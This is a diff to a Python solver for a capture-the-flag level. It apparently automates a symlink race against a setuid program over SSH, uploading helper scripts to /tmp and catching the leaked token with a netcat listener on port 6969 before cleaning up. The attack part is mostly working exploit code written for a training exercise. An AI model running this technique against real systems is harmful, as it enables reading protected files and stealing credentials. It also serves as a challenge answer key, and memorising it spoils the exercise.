@@ -2,6 +2,7 @@ import threading
 import subprocess
 import os
 from solver.utils import getflag
+import time
 
 token = ""
 
@@ -39,18 +40,59 @@ def find_ip():
 				return ip
 	return None
 
+def extract_token(output, stop_event):
+	global token
+	if not output:
+		return
+	if not (".*( )*." in output or "hello" in output):
+		token = output.strip()
+		stop_event.set()
+
 def start_server(stop_event):
 	global token
 	server = subprocess.Popen(["nc", "-l", "-k", "6969"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 	while not stop_event.is_set():
 		output = server.stdout.readline().decode()
-		if output:
-			if not (".*( )*." in output or "hello" in output):
-				token = output.strip()
-				stop_event.set()
-				break
+		extract_token(output, stop_event)
 	server.kill()
 	server.wait() # Need this line to avoid zombie processes
+
+def localhost_solver(connection, stop_event):
+	"""
+	Function to solve the challenge when the local IP address is not found.
+	It uploads the necessary scripts to the remote server, sets permissions,
+	starts a listening server, and runs the scripts to retrieve the token.
+	Args:
+		connection (SSHConnection): The SSH connection to the remote server.
+		stop_event (threading.Event): The event used to signal when to stop the threads.
+	"""
+	# Copy scripts
+	connection.upload("level10/resources/program_launcher.sh", "/tmp")
+	connection.upload("level10/resources/symlink_switcher.sh", "/tmp")
+	# Set permissions
+	connection.exec("chmod +x /tmp/program_launcher.sh")
+	connection.exec("chmod +x /tmp/symlink_switcher.sh")
+	# Start listening server
+	connection.exec("nohup nc -l -k 6969 > /tmp/level10 2>/dev/null &")
+	# Run scripts
+	# print("Running scripts...", flush=True)
+	connection.exec("nohup /tmp/symlink_switcher.sh >/dev/null 2>&1 &")
+	connection.exec("nohup /tmp/program_launcher.sh 127.0.0.1 >/dev/null 2>&1 &")
+	time.sleep(2)
+	# Kill processes
+	# print("Killing processes...", flush=True)
+	connection.exec("pkill -f program_launcher.sh || true")
+	connection.exec("pkill -f symlink_switcher.sh || true")
+	# Kill listening server
+	connection.exec("pkill -f 'nc -l*' || true")
+	# Get token
+	output = connection.exec("cat /tmp/level10")
+	# print("Output:", output)
+	for line in output.split("\n"):
+		extract_token(line, stop_event)
+	# Cleanup
+	connection.exec("rm -f /tmp/level10 /tmp/program_launcher.sh /tmp/symlink_switcher.sh")
+	connection.exec("rm -f /tmp/mine /tmp/token")
 
 def switch_symlink(connection, stop_event):
 	connection.exec(f"echo 'hello' > /tmp/mine")
@@ -68,10 +110,11 @@ def program_launch(connection, valid_ip, stop_event):
 
 def solve(connection):
 	valid_ip = find_ip()
+	stop_event = threading.Event()
 	if not valid_ip:
-		raise ValueError("No valid IP found")
+		localhost_solver(connection, stop_event)
+		return token, getflag("10", token)
 	try:
-		stop_event = threading.Event()
 		server_thread = threading.Thread(target=start_server, args=(stop_event,))
 		symlink_thread = threading.Thread(target=switch_symlink, args=(connection,stop_event,))
 		program_thread = threading.Thread(target=program_launch, args=(connection,valid_ip,stop_event,))
@@ -92,4 +135,4 @@ def solve(connection):
 				thread.join(timeout=2)
 		connection.exec("rm -f /tmp/mine /tmp/token")  # Cleanup files
 		return token, getflag("10", token)
-
+	
